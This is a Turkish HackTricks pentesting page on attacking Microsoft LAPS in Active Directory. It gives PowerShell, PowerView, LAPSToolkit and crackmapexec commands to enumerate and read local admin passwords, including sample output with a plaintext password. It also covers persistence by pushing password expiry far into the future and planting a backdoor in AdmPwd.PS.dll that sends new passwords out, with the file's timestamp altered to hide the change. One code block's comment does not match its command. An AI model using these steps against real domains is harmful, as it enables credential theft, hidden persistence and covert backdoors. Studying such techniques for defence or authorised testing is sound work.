# LAPS

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizin HackTricks'te reklamını görmek ister misiniz? Ya da en son PEASS sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz?** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* **[💬 Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) veya beni Twitter'da takip edin 🐦[@carlospolopm](https://twitter.com/hacktricks_live)**.
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya katkıda bulunun**.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Temel Bilgiler

Yerel Yönetici Parola Çözümü (LAPS), **yönetici parolalarının**, **benzersiz, rastgele ve sık sık değiştirilen** şekilde uygulandığı, etki alanına katılmış bilgisayarları yönetmek için kullanılan bir araçtır. Bu parolalar, Active Directory içinde güvenli bir şekilde depolanır ve yalnızca Erişim Kontrol Listeleri (ACL'ler) aracılığıyla izin verilen kullanıcılar tarafından erişilebilir. İstemci ile sunucu arasındaki parola iletimlerinin güvenliği, **Kerberos sürüm 5** ve **Gelişmiş Şifreleme Standardı (AES)** kullanılarak sağlanır.

LAPS'ın uygulanmasıyla etki alanının bilgisayar nesnelerinde, iki yeni özellik eklenir: **`ms-mcs-AdmPwd`** ve **`ms-mcs-AdmPwdExpirationTime`**. Bu özellikler, sırasıyla **düz metin yönetici parolasını** ve **son kullanma zamanını** depolar.

### Aktif olup olmadığını kontrol edin
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Şifre Erişimi

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` adresinden **LAPS politikasının ham halini indirebilirsiniz** ve ardından bu dosyayı insan tarafından okunabilir formata dönüştürmek için [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) paketinde bulunan **`Parse-PolFile`** kullanılabilir.

Ayrıca, **yerel LAPS PowerShell cmdlet'leri** yüklü ise erişim sağladığımız bir makinede kullanılabilir:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** ayrıca **kimin şifreyi okuyabileceğini ve okuyabileceğini** bulmak için kullanılabilir:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit), LAPS'ın çeşitli işlevlerle numaralandırılmasını kolaylaştırır.\
Bunlardan biri, **LAPS etkinleştirilmiş tüm bilgisayarlar için `ExtendedRights`'ın ayrıştırılmasıdır.** Bu, genellikle korunan gruplardaki kullanıcılar olan **LAPS şifrelerini okuma yetkisine sahip grupları** gösterecektir.\
Bir **hesap**, bir bilgisayarı bir etki alanına **katıldığında**, o makine üzerinde `Tüm Extended Rights` alır ve bu hak, **hesaba şifreleri okuma** yeteneği verir. Numaralandırma, bir kullanıcı hesabının bir makinedeki LAPS şifresini okuyabilen bir hesabı gösterebilir. Bu, bize **LAPS şifrelerini okuyabilen belirli AD kullanıcılarını hedeflemede yardımcı olabilir.**
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Crackmapexec ile LAPS Şifrelerinin Sızdırılması**
Eğer bir PowerShell erişimi yoksa, bunu uzaktan LDAP aracılığıyla istismar edebilirsiniz.
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
## **LAPS Kalıcılığı**

### **Son Kullanma Tarihi**

Yönetici olduktan sonra, şifreleri almak ve bir makinenin şifresini güncellemesini engellemek için son kullanma tarihini geleceğe ayarlamak mümkündür.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Şifre hala sıfırlanacak, eğer bir **yönetici** **`Reset-AdmPwdPassword`** komut dosyasını kullanırsa; veya **Politika tarafından gerekliden daha uzun şifre süresine izin verme** LAPS GPO'da etkinleştirilmişse.
{% endhint %}

### Arka Kapı

LAPS için orijinal kaynak kodu [burada](https://github.com/GreyCorbel/admpwd) bulunabilir, bu nedenle kod içine (örneğin `Main/AdmPwd.PS/Main.cs` içindeki `Get-AdmPwdPassword` yöntemine) bir arka kapı yerleştirmek mümkündür ve bu şekilde **yeni şifreleri dışarı çıkarabilir veya bir yerde depolayabilir**.

Ardından, yeni `AdmPwd.PS.dll` dosyasını derleyin ve `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` konumuna yükleyin (ve değişiklik zamanını değiştirin).

## Referanslar
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **Bir siber güvenlik şirketinde mi çalışıyorsunuz? Şirketinizi HackTricks'te reklamını görmek ister misiniz? veya PEASS'ın en son sürümüne erişmek veya HackTricks'i PDF olarak indirmek ister misiniz? [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
* [**Resmi PEASS & HackTricks ürünlerini alın**](https://peass.creator-spring.com)
* **Katılın** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya katkıda bulunun.**

</details>
